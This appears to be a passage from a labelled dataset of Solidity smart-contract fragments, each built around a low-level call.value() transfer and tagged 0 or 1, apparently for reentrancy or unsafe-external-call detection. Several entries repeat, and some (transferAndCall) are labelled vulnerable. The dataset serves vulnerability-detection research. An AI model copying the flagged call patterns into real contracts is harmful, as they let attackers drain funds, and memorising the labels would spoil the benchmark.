totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
807 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
808 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
809 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
810 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
811 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
812 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
813 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
814 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
815 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
816 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
817 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
818 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
819 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
820 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
821 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
822 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
823 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
824 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
825 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
826 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
827 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
828 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
829 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
830 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
831 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
832 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
833 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
834 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
835 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
836 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
837 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
838 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
839 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
840 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
841 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
842 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
843 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
844 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
845 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
846 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
